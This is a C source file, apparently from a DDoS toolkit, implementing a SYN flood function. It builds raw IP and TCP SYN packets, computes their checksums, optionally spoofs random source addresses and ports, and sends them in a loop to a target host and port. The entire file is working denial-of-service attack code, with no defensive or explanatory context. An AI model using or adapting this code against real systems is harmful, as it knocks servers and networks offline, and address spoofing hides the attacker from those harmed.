#include "common.h"

#define DDOS_TCPHDR_LEN 20
struct syn_payload {
    struct ip ip;
    struct tcphdr tcp;
};

struct psh {
    u_int32_t srcaddr, dstaddr;
    u_int8_t reserved, protocol;
    u_int16_t tcplen;
    struct tcphdr tcp;
};

void syn_flood(struct in_addr src, ushort srcport, struct in_addr dst, ushort dstport, struct ddos_flags flags, unsigned long long maxcount)
{
    struct syn_payload payload;
    struct psh psh;
    
    assert(flags.ip_spoof || src.s_addr);
    
    int fd = ip_rawsocket();
    struct sockaddr_in sockdst;
    ip_mksaddr(&sockdst, dst);
    
    ip_init(&payload.ip, IPPROTO_TCP);
    ip_setsrc(&payload.ip, src);
    ip_setdst(&payload.ip, dst);
    
    struct counter cnt;
    counter_reset(&cnt, "packets");
    
    while (counter_less(&cnt, maxcount)) {
        if (flags.ip_spoof) payload.ip.ip_src.s_addr = rand_u32();
        if (flags.rand_sport) srcport = rand_port();
        ip_setid(&payload.ip, rand_u16());
        
        assert(DDOS_TCPHDR_LEN % 4 == 0);
        psh = (struct psh) {
            .srcaddr = payload.ip.ip_src.s_addr,
            .dstaddr = payload.ip.ip_dst.s_addr,
            .reserved = 0,
            .protocol = IPPROTO_TCP,
            .tcplen = htons(DDOS_TCPHDR_LEN),
            
            .tcp = (struct tcphdr) {
                .th_sport = htons(srcport),
                .th_dport = htons(dstport),
                .th_seq = rand_u32(),
                .th_ack = 0,
                .th_off = DDOS_TCPHDR_LEN / 4,
                .th_x2 = 0,
                .th_flags = TH_SYN,
                .th_win = htons(5840),
                .th_sum = 0,
                .th_urp = 0,
            },
        };
        
        //dump(&psh, sizeof(psh));
        psh.tcp.th_sum = in_cksum((ushort *) &psh, sizeof(psh));
        memcpy(&payload.tcp, &psh.tcp, sizeof(payload.tcp));
        
        ip_resize(&payload.ip, DDOS_TCPHDR_LEN);
        ip_cksum(&payload.ip);

        int r = sendto(fd, &payload, ip_size(&payload.ip), 0, (struct sockaddr *) &sockdst, sizeof(sockdst));
        assert(r > 0);
        
        if (counter_less(&cnt, 1)) dump(&payload, ip_size(&payload.ip));
        counter_inc(&cnt);
    }
    
    close(fd);
}
